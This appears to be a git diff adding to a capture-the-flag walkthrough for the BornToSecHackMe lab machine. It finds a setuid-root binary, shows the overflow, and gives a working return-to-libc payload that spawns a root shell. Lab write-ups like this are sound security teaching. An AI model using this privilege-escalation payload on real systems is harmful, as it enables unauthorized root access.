@@ -1701,14 +1701,51 @@ echo -n 'SLASH' | md5sum
 su zaz
 ```
 ```
-zaz@BornToSecHackMe:~$
+zaz@BornToSecHackMe:~$ ls -la
+total 16
+drwxr-x--- 1 zaz      zaz    60 Oct 15  2015 .
+drwxrwx--x 1 www-data root  120 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz   248 Jun  5 10:34 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+zaz@BornToSecHackMe:~$ file exploit_me
+exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
 ```
+There is an executable named 'exploit_me' with it's setuid set to root.
+Let's run it and see what it does.
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me
+
+zaz@BornToSecHackMe:~$ ./exploit_me qweeeeeeeeeeeeeeeeeeeeee
+qweeeeeeeeeeeeeeeeeeeeee
+
+zaz@BornToSecHackMe:~$ ./exploit_me cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+Segmentation fault (core dumped)
+```
+
+We can see that it runs into a segmentation fault if we give it too big of a string.
+
+Because this is a security challenge we know that this segv is a buffer overflow and that we can exploit it.
+
+We need to know 
 
 Here, we can run a stack buffer overflow, because this file SEGVs when we send it more than 140 characters.
 
 Because it's setuid bit is set to root, we will win if we can find a way to spawn a shell.
 
-payload :
-```
+We first need to find out how many bytes we need to send until our content overwrites `eip`. Then, we can do a return to libc exploit by adding the address of system to overwrite the one of exit and moving "/bin/sh" as an argument to it
 
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("\x90" * 140 +  "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7"  + "\x58\xcc\xf8\xb7")')
+#[......]
+# whoami
+root
+#
 ```
